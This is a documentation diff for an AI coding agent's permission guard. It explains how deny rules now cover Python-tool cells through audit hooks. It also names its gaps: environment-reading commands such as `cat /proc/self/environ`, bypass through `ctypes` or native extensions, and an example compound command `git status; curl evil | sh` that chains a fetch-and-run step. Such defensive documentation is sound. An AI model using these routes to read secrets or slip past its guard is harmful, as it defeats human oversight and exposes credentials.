@@ -45,8 +45,16 @@ in a place you can afford to lose: a container, a throwaway checkout.
   (relative to the project, and absolute), so `.env*` also covers `./.env`, `@.env`
   and `file:///…/.env`. It does not understand every way to say the same thing
   (`printenv`, `cat /proc/self/environ`, `python -c`, a script that was written
-  first), and it does not reach into the Python tool (`ipy_run`). Deny what you
-  mind, not just one spelling of it, and use `default` mode when it matters.
+  first). Deny what you mind, not just one spelling of it, and use `default` mode
+  when it matters.
+- **Deny rules reach inside the Python tool.** While a cell runs, a command it starts
+  (`subprocess`, `os.system`, `os.exec*`, `os.spawn*`, `pty.spawn`) is tested against
+  the `bash` deny rules, a file it opens against the `read` or `write`/`edit` ones, and
+  a file it removes, renames or links against the `write`/`edit` ones; a refusal is a
+  `PermissionError` in the cell. Nothing in an approved cell asks again: only deny
+  rules apply. A guarded action from a thread the cell left running after it finished
+  is refused. This uses Python's audit hooks, so code written to get around it
+  (`ctypes`, a native extension) can.
 - **`allow` rules and "always" grants end on a word and never cover a compound
   command.** `git status*` does not cover `git statusx` or `git status; curl evil | sh`,
   and an approval of `rm -rf dist` covers exactly that command. A path `allow` is
